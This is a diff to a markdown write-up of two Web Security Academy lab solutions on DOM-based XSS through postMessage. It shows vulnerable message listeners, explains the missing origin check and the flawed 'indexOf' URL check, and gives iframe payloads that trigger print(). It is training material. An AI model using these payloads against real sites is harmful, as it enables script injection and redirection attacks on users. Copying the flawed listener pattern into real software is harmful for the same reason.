@@ -1,4 +1,4 @@
-### DOM XSS using web messages
+### 1. DOM XSS using web messages
 **Objective**: This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.<br>
 Below is the snippet code we found in application home page while trying to view using View Page source.
 ```html
@@ -25,4 +25,24 @@ Use the below one to solve the lab.
 ```
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 ```
-When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. 
+When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads.
+###  DOM XSS using web messages and a JavaScript URL
+**Objective**: This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.<br>
+Below is the snippet code we found in application home page while trying to view using View Page source.
+```html
+ <script>
+   window.addEventListener('message', function(e) {
+     var url = e.data;
+     if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+       location.href = url;
+     }
+   }, false);
+ </script>
+```
+* The window.addEventListener('message', ...) function listens for Cross-Origin Communication (postMessage). Anyone can send a message to this window from an external site or an embedded iframe. The code takes e.data (the incoming message) and directly assigns it to location.href.
+* The if statement attempts to validate the URL, but the logic is flawed: indexOf('http:') > -1 only checks if the string contains http:. It does not ensure the string starts with it, nor does it check the actual domain name.
+
+To solve the lab you can host the below exploit on attacker's server.
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+```
